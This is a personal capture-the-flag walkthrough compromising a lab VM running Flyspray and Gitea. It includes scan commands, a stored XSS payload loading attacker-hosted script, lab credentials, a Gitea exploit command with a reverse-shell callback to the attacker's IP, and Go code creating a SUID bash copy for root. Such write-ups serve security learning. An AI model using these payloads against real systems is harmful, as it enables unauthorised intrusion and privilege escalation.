*By Praveen Kumar Sharma*

<hr>

For me The IP of the machine is : **192.168.110.119**

![[Pasted image 20240813220101.png]]

Its online!!

<hr>

### Port Scanning 

#### All Port Scanning :

```
nmap -p- -n -Pn -T5 --min-rate=10000 192.168.110.119 -o allPortScan.txt
```

![[Pasted image 20240813220517.png]]

>[!Open Ports]
>PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
3306/tcp open  mysql
5000/tcp open  upnp

Lets try a aggresive scan on these

#### Aggressive Scanning : 

```
nmap -sC -sV -A -T5 -p 22,80,3000,3306,5000 192.168.110.119 -o aggressiveScan.txt
```

![[Pasted image 20240813221131.png]]
![[Pasted image 20240813221156.png]]
![[Pasted image 20240813221221.png]]
![[Pasted image 20240813221237.png]]

>[!Aggresive Scan]
>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
>3000/tcp open  http    Golang net/http server
>3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
>5000/tcp open  http    Golang net/http server

We do some http on port 80 lets try directory fuzzing 

<hr>

### Directory Fuzzing :

```
gobuster dir -u 192.168.110.119 -w /usr/share/wordlists/dirb/common.txt -o directories.txt
```

![[Pasted image 20240813221755.png]]

>[!Directories]
>/flyspray             (Status: 301) [Size: 240] [--> http://192.168.110.119/flyspray/]
/index.html           (Status: 200) [Size: 251]
/posts                (Status: 301) [Size: 237] [--> http://192.168.110.119/posts/]

Lets get this web application underway

<hr>

### Web Application : 

![[Pasted image 20240813222124.png]]

Nothing in special in the source code just a warning for the rabbit hole

![[Pasted image 20240813222245.png]]

Lets see the /posts first 

![[Pasted image 20240813222403.png]]

Nothing here too if we dont find anuything anywhere else ill try directory fuzzing on this /posts but lets see the /flyspray

![[Pasted image 20240813222603.png]]

Looks like we do have a login here but first lets see if we can find any vulnerability of this flyspray (can't really the version on this) 

lets try searchsploit here first 

![[Pasted image 20240813222735.png]]

this XSS+CSRF might be our entry here

You can get this .txt file like this 

![[Pasted image 20240813222859.png]]

U can read this if u want im gonna just implement this as described in this 

First we need to create a user here 

Click on the login then to register

The creds for me are `test1:test1`

![[Pasted image 20240813223147.png]]

Register this u should see this 

![[Pasted image 20240813223214.png]]

then login then go to the top right user icon 

![[Pasted image 20240813223312.png]]

u should see this 

![[Pasted image 20240813223348.png]]

We have XSS here now 

Now to exploit from the text file copy the javascript code and save to a .js file called exploit.js

like this 

![[Pasted image 20240813223516.png]]

Now start a python server like this 

![[Pasted image 20240813223554.png]]

Here u might need to create a new user if u have problem changing the settings for this test1 user

For me it works so im gonna move forward

First go to the Tasklist -> Bug Report 
Then at the bottom add a comment i wrote this 

![[Pasted image 20240813223902.png]]

Now we are gonna edit the user setting for this exploit.js

```
"><script src="http://192.168.110.64/script.js"></script>
```

Add this in the Real Name then hit update settings 

![[Pasted image 20240813224118.png]]

Wait a minute or two to see it ping our python server 

Got it 

![[Pasted image 20240813224328.png]]

Now logout then login using `hacker:12345678` creds 

>[!Warning]
>Fair Warning here 
>If this doesnt work for you immediately make another account and do this again 
>and if that doesnt work then change the script.js to exploit.js 
>and change the real name again to point to exploit.js (this one worked for me)


we have this 

![[Pasted image 20240813230217.png]]

![[Pasted image 20240813230226.png]]

A set of creds 

>[!Creds]
>Username : achilles
>Password : h2sBr9gryBunKdF9


<hr>

### Gaining Access :

So im gonna save u time to say that we have a self host gitea running on port 3000 that's why its open, lets login with this user

![[Pasted image 20240813230439.png]]

Lets login as that user 

![[Pasted image 20240813230529.png]]

![[Pasted image 20240813230637.png]]

Two private repos here 

and in the bottom on the page 

![[Pasted image 20240813230728.png]]

Lets check for exploit for this version

![[Pasted image 20240813230833.png]]

This is not the right version but this worked for me so copy this to your dir like this 

![[Pasted image 20240813230939.png]]

i changed the name to this so its to work with

![[Pasted image 20240813231039.png]]

alright execute it like this 

```
python3 exploit.py -t http://192.168.110.119:3000 -u achilles -p h2sBr9gryBunKdF9 -I 192.168.110.64 -P 9001
```

it should show this in the end 

![[Pasted image 20240813231224.png]]

Now go to Symfonos-blog repo 

Then go to settings (repo) -> Git Hooks -> Pre-recieve 
Then click on the right edit button of pre-recieve

then add this here and hit update hook

![[Pasted image 20240813231828.png]]

Start a listener right now :

![[Pasted image 20240813232052.png]]

Now we need to make a commit for this shell to work 
go to the index.php in the same repo

add a html comment then hit commit changes 

![[Pasted image 20240813232159.png]]

and we get a shell 

![[Pasted image 20240813232226.png]]

Lets upgrade this :

![[Pasted image 20240813232322.png]]

<hr>

### Lateral PrivEsc

So lets see the users on this machine

![[Pasted image 20240813232422.png]]

the same name lets try that password again here too 

![[Pasted image 20240813232523.png]]

We got in as that achilles user now 

<hr>

### Vertical PrivEsc

Lets check the sudo permission 

![[Pasted image 20240813232702.png]]

So we can just run go on this lets make a program for this 

![[Pasted image 20240813232831.png]]

```go
package main

import (
	"fmt"
	"log"
	"os/exec"
)

func main() {
	out, err := exec.Command("whoami").Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(out))
}
```

Lets get this on there using a python server 

![[Pasted image 20240813233020.png]]

and lets run it 

![[Pasted image 20240813233212.png]]

and we can run out program as root lets make a SUID binary of /bin/bash that we can run as root 

![[Pasted image 20240813233356.png]]

```go
package main

import (
	"fmt"
	"log"
	"os/exec"
)

func main() {
	out, err := exec.Command("/bin/bash", "-c", "cp /bin/bash /tmp/pwnshell; chmod +xs /tmp/pwnshell").Output()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(out))
}
```

Lets get this to our machine now 

![[Pasted image 20240813233515.png]]

Lets run it now 

![[Pasted image 20240813233535.png]]

lets run this pwnshell with the -ip arguements
- -i : interactive shell
- -p : priviledge mode

![[Pasted image 20240813233646.png]]

here is the proof

![[Pasted image 20240813233707.png]]

